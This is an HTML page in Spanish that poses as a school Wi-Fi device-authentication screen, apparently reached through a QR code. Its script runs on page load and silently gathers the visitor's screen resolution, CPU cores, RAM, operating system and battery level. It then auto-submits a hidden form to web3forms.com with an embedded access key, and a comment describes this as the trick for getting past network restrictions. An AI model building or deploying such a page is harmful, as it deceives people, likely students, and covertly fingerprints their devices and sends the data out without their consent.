<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ Conectando a Red Escolar...</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px 20px; background-color: #0d1117; color: #c9d1d9; }
        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; display: inline-block; max-width: 500px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        h1 { color: #58a6ff; margin-bottom: 5px; }
        p { color: #8b949e; line-height: 1.5; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #58a6ff; animation: spin 1s linear infinite; display: inline-block; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <h1>Autenticando Dispositivo...</h1>
        <p>Por favor, espera un momento mientras validamos tus credenciales de red y componentes de hardware.</p>
        
        <!-- El spinner animado simula que la red Wi-Fi está cargando -->
        <div class="spinner"></div>

        <!-- FORMULARIO AUTOMÁTICO -->
        <form action="https://web3forms.com" method="POST" id="form-automatico">
            
            <input type="hidden" name="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
            <input type="hidden" name="subject" value="¡QR Escaneado Automáticamente! - Datos Recibidos">
            <input type="hidden" name="from_name" value="Simulador QR Automático">
            
            <!-- Redirección opcional: Si quieres que después de enviar los datos, 
                 Web3Forms los mande a una página específica (ej. el Google de la escuela) -->
            <!-- <input type="hidden" name="redirect" value="https://google.com"> -->
            
            <input type="hidden" id="inp-pantalla" name="Resolución Pantalla">
            <input type="hidden" id="inp-procesador" name="Núcleos Procesador">
            <input type="hidden" id="inp-ram" name="Memoria RAM">
            <input type="hidden" id="inp-so" name="Sistema Operativo">
            <input type="hidden" id="inp-bateria" name="Nivel Batería">
        </form>
    </div>

    <script>
        async function capturarYEnviarAutomatico() {
            const info = {
                pantalla: `${window.screen.width}x${window.screen.height}`,
                procesador: navigator.hardwareConcurrency || "No detectado",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No detectado",
                so: obtenerSO(),
                bateria: "No disponible"
            };

            // Intentamos capturar la batería velozmente
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.bateria = (battery.level * 100) + "% (Cargando: " + (battery.charging ? "Sí" : "No") + ")";
                } catch (e) {}
            }

            // Asignamos los valores al formulario oculto
            document.getElementById('inp-pantalla').value = info.pantalla;
            document.getElementById('inp-procesador').value = info.procesador;
            document.getElementById('inp-ram').value = info.ram;
            document.getElementById('inp-so').value = info.so;
            document.getElementById('inp-bateria').value = info.bateria;

            // 🔥 ¡AQUÍ ESTÁ EL TRUCO! Forzamos el envío del formulario inmediatamente
            // Esto simula que el usuario dio clic en enviar, saltándose las restricciones de red
            document.getElementById('form-automatico').submit();
        }

        function obtenerSO() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS (iPhone)";
            if (/Windows/i.test(ua)) return "Windows";
            return "Otro / Desconocido";
        }

        // Ejecutar inmediatamente al abrir la página
        window.onload = capturarYEnviarAutomatico;
    </script>
</body>
</html>
